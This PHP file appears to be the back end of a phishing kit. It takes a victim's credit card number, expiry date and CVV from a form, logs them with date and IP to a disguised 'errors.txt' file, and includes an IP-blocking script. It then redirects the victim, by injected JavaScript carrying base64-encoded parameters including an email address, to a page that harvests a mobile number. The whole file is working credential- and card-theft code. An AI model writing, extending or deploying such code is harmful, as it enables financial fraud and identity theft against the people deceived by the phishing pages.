<?php
include 'AddResult.php';
include 'ip_blocker.php';
if(isset($_POST['CCNUMBER'])) {

     $victim_creds = "<span style='color:gray;'>{$date} {$IP}</span>  <span style='color:yellow;'>CC Number</span> > [<span style='color:green;'>{$_POST['CCNUMBER']}</span>]<br>";
          AddResult('errors.txt', $victim_creds);

     $victim_creds = "<span style='color:gray;'>{$date} {$IP}</span>  <span style='color:yellow;'>EXP</span> > [<span style='color:green;'>{$_POST['EXP']}</span>]<br>";
          AddResult('errors.txt', $victim_creds);

     $victim_creds = "<span style='color:gray;'>{$date} {$IP}</span>  <span style='color:yellow;'>CVV</span> > [<span style='color:green;'>{$_POST['CVV']}</span>]<br>";
          AddResult('errors.txt', $victim_creds);


     $m = $_POST['YES'];
	echo "<script>";
	echo "window.location.assign('mobilenumber.php?auth=$m&secure=dW5hbWU=&id=bWFuZ21ra2Vwd2VuZ0B5YWhvby5jb20=');";
	echo "</script>";

}
?>
